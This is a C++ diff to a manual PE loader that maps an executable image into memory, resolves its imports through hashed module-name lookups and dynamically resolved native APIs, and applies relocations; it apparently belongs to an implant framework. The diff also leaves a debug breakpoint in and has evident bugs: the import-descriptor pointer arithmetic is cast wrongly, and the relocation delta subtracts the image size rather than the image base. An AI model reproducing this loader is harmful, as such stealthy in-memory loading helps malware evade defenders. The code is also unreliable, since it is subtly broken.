@@ -375,23 +375,25 @@ namespace Modules {
 
     BOOL ResolveImports(const EXECUTABLE *module) {
 
+		__debugbreak();
         PIMAGE_IMPORT_BY_NAME import_name      = nullptr;
         PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc = nullptr;
 
-        PIMAGE_THUNK_DATA first_thunk          = nullptr;
-        PIMAGE_THUNK_DATA org_first            = nullptr;
+		LDR_DATA_TABLE_ENTRY *entry    = nullptr;
+        PIMAGE_THUNK_DATA first_thunk  = nullptr;
+        PIMAGE_THUNK_DATA org_first    = nullptr;
 
-        IMAGE_DATA_DIRECTORY *data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+		if (module->nt_head->Signature != IMAGE_NT_SIGNATURE) {
+			return false;
+		}
+
+        PIMAGE_DATA_DIRECTORY data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
         UINT8 local_buffer[MAX_PATH] = { };
 
         if (data_dire->Size) {
-
             DWORD count = 0;
-			// NOTE: access violation trying to access import_desc. the image might be broken.
-			// TEST: watch it read the image for import descriptor.
-			__debugbreak();
 
-            auto import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
+            PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR) B_PTR(module->base) + data_dire->VirtualAddress;
             for (auto scan = import_desc; scan->Name; scan++) {
                 count++;
             }
@@ -401,7 +403,7 @@ namespace Modules {
 
                 const char *name = (char*) module->base + import_desc->Name;
 
-                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, name), MbsLength(name)))) {
+                if (entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, name), MbsLength(name)))) {
                     library = (HMODULE) entry->DllBase;
                 }
                 else {
@@ -547,12 +549,17 @@ namespace Modules {
         HEXANE;
 
 		bool success = false;
+
+		SIZE_T region_size = 0;
+		UINT_PTR base_rva  = 0;
+		PIMAGE_DATA_DIRECTORY relocdir = nullptr;
+		
 		if (!module->nt_head) {
-			goto defer;
+			return false;
 		}
 
         module->base = module->nt_head->OptionalHeader.ImageBase;
-        auto region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
+        region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
 
         if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
             module->base != module->nt_head->OptionalHeader.ImageBase) {
@@ -583,8 +590,8 @@ namespace Modules {
             }
         }
 
-        UINT_PTR base_rva = module->base - module->nt_head->OptionalHeader.SizeOfImage;
-        PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        base_rva = module->base - module->nt_head->OptionalHeader.SizeOfImage;
+        relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
         // if non-zero rva and relocdir exists...
         if ((module->base - module->nt_head->OptionalHeader.ImageBase) && relocdir) {
@@ -613,7 +620,7 @@ namespace Modules {
 	defer:
 		if (!success) {
 			if (module->base) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**)&module->base, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**)&module->base, &region_size, MEM_RELEASE);
 			}
 		}
 
